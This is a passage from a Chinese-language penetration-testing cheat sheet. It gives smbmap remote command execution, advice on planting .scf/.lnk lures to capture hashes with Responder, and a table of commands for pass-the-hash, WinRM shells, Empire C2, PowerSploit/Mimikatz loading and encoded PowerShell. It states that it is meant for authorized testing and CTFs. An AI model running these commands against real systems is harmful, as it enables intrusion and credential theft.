smbmap -H <ip> -u <user> -p <password> -x 'whoami'
```

**实战要点**:
- 找到 WRITE 权限共享是关键:可投递 .scf/.lnk 诱饵配合 Responder 捕获 hash
- 大域批量跑:对 CIDR 逐 IP 调用,`-d <domain>` 指定域避免本地账户歧义
- 与 `nxc smb --shares` 相比,smbmap 能直接下钻文件内容

## 其余工具速查

| 工具 | 一句话用途 | 安装包 | 最常用命令 |
|---|---|---|---|
| azurehound | Azure 版 BloodHound 数据采集器 | azurehound | `azurehound start --tenant <tenant_id> --client-id <app_id> --client-secret <secret>` |
| evil-winrm-py | Python 实现的 WinRM shell(支持 NTLM/PTH/证书/Kerberos) | evil-winrm-py | `evil-winrm-py -i <ip> -u <user> -p <password>` |
| nishang | PowerShell 攻击脚本集(反弹 shell、提权、信息收集) | nishang | `ls /usr/share/nishang/`(经 `evil-winrm -s` 加载后调用 Invoke-*) |
| passing-the-hash | pth- 前缀的哈希认证版 curl/winexe/samba 等 | passing-the-hash | `pth-winexe -U '<domain>/<user>%<lm_hash>:<nt_hash>' //<ip> cmd` |
| powershell-empire | PowerShell/Python C2 与后渗透框架 | powershell-empire | `powershell-empire server` / `powershell-empire client` |
| powersploit | PowerShell 后渗透模块集(Inject/Mimikatz/Recon) | powersploit | `ls /usr/share/powersploit/`(目标侧 IEX 下载加载) |
| pwsh | 跨平台 PowerShell,本地生成/测试 PS payload 与 AMSI 研究 | powershell | `pwsh -nop -enc <base64_utf16le_command>` |
| rdesktop | 传统 RDP 客户端(已停更,仅兜底) | rdesktop | `rdesktop -u <user> -p <password> <ip>:3389` |
| xfreerdp3 | FreeRDP3 RDP 客户端(活跃维护,支持网关/动态分辨率) | freerdp3-x11 | `xfreerdp3 /v:<ip> /u:<domain>\\<user> /p:<password> /dynamic-resolution +clipboard` |

> 本文件仅用于已获得书面授权的渗透测试、CTF 竞赛与安全教育场景。
